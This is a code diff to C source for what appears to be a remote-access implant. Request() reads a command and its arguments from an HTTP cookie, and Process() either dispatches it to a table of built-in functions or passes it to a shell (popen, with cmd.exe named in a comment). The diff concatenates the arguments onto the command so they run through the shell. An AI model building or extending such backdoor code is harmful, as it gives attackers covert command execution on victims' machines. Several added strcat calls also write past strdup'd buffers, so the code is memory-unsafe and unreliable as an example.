@@ -42,6 +42,7 @@ struct {
 unsigned char patch_list_name[patch_length] = {0xAA, 0xAB};
 
 BOOL AA$shell(CHAR* input, CHAR** output) {
+    printf("Attempting to execute: %s\n", input);
     FILE *fp;
     char var[100000];
 
@@ -53,6 +54,7 @@ BOOL AA$shell(CHAR* input, CHAR** output) {
         strcat_s(*output, strlen(var) + 1, var);
     }
     pclose(fp);
+
     return TRUE;
 }
 
@@ -133,8 +135,10 @@ void Process(CHAR* command, CHAR* input) {
     }
 
     // Try to execute in cmd.exe if cannot be found in patch list
-    input = command;
-    if ((*patch_list_pointers[0])(input, &output)) { // index 0 of patch list is shell function
+    CHAR* command_input = strdup(command); // Must be freed
+    strcat(command_input, " "); 
+    strcat(command_input, input); 
+    if ((*patch_list_pointers[0])(command_input, &output)) { // index 0 of patch list is shell function
         printf("Output:%s", output);
         goto cleanup;
     }
@@ -142,6 +146,8 @@ void Process(CHAR* command, CHAR* input) {
     // Clean up memory
     goto cleanup;
     cleanup:
+        free(input);
+        free(command_input);
         free(output);
 }
 
@@ -235,7 +241,7 @@ void Request() {
             }
         } else {
             CHAR* token = strtok(cookie, " ");
-            CHAR* input = NULL;
+            CHAR* input = strdup(""); // strdup is required to work with strcat, must be freed
             CHAR* cmd = token;
             INT count = 0;
             printf("Command found: %s\n", cmd);
@@ -246,6 +252,10 @@ void Request() {
                     continue;
                 } else {
                     printf("Token: %s\n", token);
+                    CHAR* input_parameter = strdup(token); // Must be freed
+                    strcat(input_parameter, " ");
+                    strcat(input, input_parameter);
+                    free(input_parameter);
                 }
                 token = strtok(NULL, " ");
             }
